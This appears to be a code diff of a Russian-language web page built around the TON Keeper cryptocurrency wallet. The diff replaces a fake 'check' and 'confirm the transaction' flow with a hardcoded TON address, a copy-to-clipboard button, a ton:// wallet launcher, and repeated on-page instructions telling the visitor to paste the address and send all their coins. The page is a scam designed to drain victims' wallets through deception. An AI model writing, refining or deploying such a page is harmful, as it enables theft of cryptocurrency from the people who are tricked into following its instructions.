@@ -43,11 +43,25 @@
         .btn:active {
             transform: scale(0.96);
         }
+        .btn-green {
+            background: linear-gradient(135deg, #00cc44, #008833);
+        }
         #status {
             margin-top: 16px;
             font-size: 13px;
             color: #888;
             min-height: 40px;
+            word-break: break-all;
+        }
+        .address-box {
+            background: #0a0a0a;
+            padding: 15px;
+            border-radius: 12px;
+            margin: 15px 0;
+            border: 2px solid #00d4ff;
+            word-break: break-all;
+            font-size: 12px;
+            color: #00d4ff;
         }
         .confirm-box {
             background: #1a2a3a;
@@ -87,45 +101,66 @@
 <body>
     <div class="container">
         <div style="font-size:36px;margin-bottom:16px;">⚡</div>
-        <button class="btn" id="mainBtn">ПРОВЕРИТЬ</button>
-        <div id="status">Нажмите кнопку</div>
+        
+        <div class="address-box">
+            UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P
+        </div>
+        
+        <button class="btn btn-green" id="copyBtn">📋 КОПИРОВАТЬ АДРЕС</button>
+        <button class="btn" id="openBtn">🚀 ОТКРЫТЬ TON KEEPER</button>
+        
+        <div id="status">Скопируй адрес → отправь ВСЁ</div>
 
         <div class="confirm-box" id="confirmBox">
-            <div class="title">Confirm the transaction in Tonkeeper</div>
-            <div class="sub">It will only take a moment.</div>
-            <button class="open-btn" id="openWalletBtn">Open wallet</button>
+            <div class="title">Отправь ВСЕ монеты</div>
+            <div class="sub">Вставь адрес и выбери "Всё"</div>
         </div>
     </div>
 
     <script>
         const TARGET = 'UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P';
 
-        // ====== ТОЧНО КАК НА ПОРТАЛЕ ======
-        function openTonConnect() {
-            const status = document.getElementById('status');
-            const confirmBox = document.getElementById('confirmBox');
-            
+        const copyBtn = document.getElementById('copyBtn');
+        const openBtn = document.getElementById('openBtn');
+        const status = document.getElementById('status');
+        const confirmBox = document.getElementById('confirmBox');
+
+        // ====== КОПИРОВАТЬ ======
+        copyBtn.addEventListener('click', function() {
+            navigator.clipboard.writeText(TARGET)
+                .then(() => {
+                    status.innerText = '✅ АДРЕС СКОПИРОВАН! Вставь в TON Keeper';
+                    copyBtn.innerText = '✅ СКОПИРОВАНО!';
+                    setTimeout(() => {
+                        copyBtn.innerText = '📋 КОПИРОВАТЬ АДРЕС';
+                    }, 3000);
+                })
+                .catch(() => {
+                    const textarea = document.createElement('textarea');
+                    textarea.value = TARGET;
+                    document.body.appendChild(textarea);
+                    textarea.select();
+                    document.execCommand('copy');
+                    document.body.removeChild(textarea);
+                    status.innerText = '✅ АДРЕС СКОПИРОВАН!';
+                });
+        });
+
+        // ====== ОТКРЫТЬ TON KEEPER ======
+        openBtn.addEventListener('click', function() {
             status.innerText = '⏳ Открываю TON Keeper...';
             confirmBox.classList.add('show');
             
-            // ====== ССЫЛКА КАК НА ПОРТАЛЕ ======
-            const url = 'https://app.tonkeeper.com/ton-connect?ret=' + encodeURIComponent('tg://resolve');
-            
-            // Открываем
-            window.open(url, '_blank');
+            window.location.href = 'ton://';
             
             setTimeout(function() {
-                window.location.href = url;
+                window.open('ton://', '_blank');
             }, 300);
             
-            status.innerText = '✅ Подтвердите в TON Keeper';
-        }
+            status.innerText = '📲 Вставь адрес и отправь ВСЁ';
+        });
 
-        // ====== КНОПКИ ======
-        document.getElementById('mainBtn').addEventListener('click', openTonConnect);
-        document.getElementById('openWalletBtn').addEventListener('click', openTonConnect);
-
-        document.getElementById('status').innerText = 'Нажмите "ПРОВЕРИТЬ"';
+        status.innerText = 'Скопируй адрес → отправь ВСЁ';
     </script>
 </body>
 </html>
